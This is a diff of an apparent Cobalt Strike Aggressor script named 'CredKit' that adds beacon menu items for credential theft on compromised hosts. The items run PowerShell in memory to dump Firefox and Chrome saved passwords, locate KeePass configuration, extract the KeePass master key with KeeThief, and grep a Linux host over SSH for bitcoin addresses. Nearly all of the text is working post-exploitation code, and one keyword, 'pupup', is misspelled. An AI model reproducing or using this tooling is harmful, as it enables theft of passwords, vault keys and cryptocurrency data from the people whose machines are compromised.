@@ -3,68 +3,64 @@
 
 popup beacon_bottom {
 	menu "CredKit" {
-		menu "Windows" {
-			item "Get Firefox Passwords"{
-				local('$bid');
-				foreach $bid ($1){
-					binput($1, "powershell-import Get-FirefoxPasswords.ps1");
-					# read in the powershell script
-					$handle = openf(script_resource("scripts/Get-FirefoxPasswords.ps1"));
-					$firefox_script = readb($handle, -1);
-					closef($handle);
-					# host firefox script on beacon
-					$cmd = beacon_host_script($1, $firefox_script);
-					binput($bid, "powershell Get-FirefoxPasswords");
-					sleep(5 * 1000);
-					# execute in-memory hosted script
-					bpowerpick($1, "$cmd");
-				}
-			}
-			item "Get Chrome Passwords"{
-				local('$bid');
-				foreach $bid ($1){
-					binput($1, "powershell-import Get-ChromePasswords.ps1");
-					# read in the powershell script
-					$handle = openf(script_resource("scripts/Get-ChromePasswords.ps1"));
-					$chrome_script = readb($handle, -1);
-					closef($handle);
-					$cmd = beacon_host_script($bid, $chrome_script);
-					binput($bid, "powerpick Get-ChromePasswords");
-					sleep(50 * 1000);
-					# execute in-memory hosted script
-					bpowerpick($bid, "$cmd");
-				}
-			}
-			item "Find KeePass Config"{
-				local('$bid');
-				foreach $bid ($1) {
-					binput($1, "powershell-import KeePassConfig.ps1");
-					bpowershell_import($bid, script_resource("scripts/KeePassConfig.ps1"));
-					binput($bid, "powershell Find-KeePassconfig");
-					bpowershell($bid, "Find-KeePassconfig");
-				}
-			}
-			item "Get KeePass database master key"{
-				local('$bid');
-				foreach $bid ($1) {
-					binput($bid, "powershell-import KeeThief.ps1");
-					bpowershell_import($bid, script_resource("scripts/KeeThief.ps1"));
-					binput($bid, "powershell Get-KeePassDatabaseKey -Verbose");
-					bpowershell($bid, "Get-KeePassDatabaseKey -Verbose");
-				}
+		item "Get Firefox Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Get-FirefoxPasswords.ps1");
+				# read in the powershell script
+				$handle = openf(script_resource("scripts/Get-FirefoxPasswords.ps1"));
+				$firefox_script = readb($handle, -1);
+				closef($handle);
+				# host firefox script on beacon
+				$cmd = beacon_host_script($1, $firefox_script);
+				binput($bid, "powershell Get-FirefoxPasswords");
+				sleep(5 * 1000);
+				# execute in-memory hosted script
+				bpowerpick($1, "$cmd");
 			}
 		}
-		menu "Linux"{
-			item "Find bitcoin addresses"{
-				local('$bid');
-				foreach $bid ($1){
-					if (-isssh $bid){
-							bshell($1, 'egrep "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$" / -R 2>/dev/null');
-					}
-					else {
-						blog($1, "This is not an SSH beacon!");
-					}
-				}
+		item "Get Chrome Passwords"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Get-ChromePasswords.ps1");
+				# read in the powershell script
+				$handle = openf(script_resource("scripts/Get-ChromePasswords.ps1"));
+				$chrome_script = readb($handle, -1);
+				closef($handle);
+				$cmd = beacon_host_script($bid, $chrome_script);
+				binput($bid, "powerpick Get-ChromePasswords");
+				sleep(50 * 1000);
+				# execute in-memory hosted script
+				bpowerpick($bid, "$cmd");
+			}
+		}
+		item "Find KeePass Config"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($1, "powershell-import KeePassConfig.ps1");
+				bpowershell_import($bid, script_resource("scripts/KeePassConfig.ps1"));
+				binput($bid, "powershell Find-KeePassconfig");
+				bpowershell($bid, "Find-KeePassconfig");
+			}
+		}
+		item "Get KeePass database master key"{
+			local('$bid');
+			foreach $bid ($1) {
+				binput($bid, "powershell-import KeeThief.ps1");
+				bpowershell_import($bid, script_resource("scripts/KeeThief.ps1"));
+				binput($bid, "powershell Get-KeePassDatabaseKey -Verbose");
+				bpowershell($bid, "Get-KeePassDatabaseKey -Verbose");
+			}
+		}
+	}
+}
+
+pupup ssh {
+	menu "CredKit" {
+		item "Find bitcoin addresses"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, 'egrep "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$" / -R 2>/dev/null');
 			}
 		}
 	}
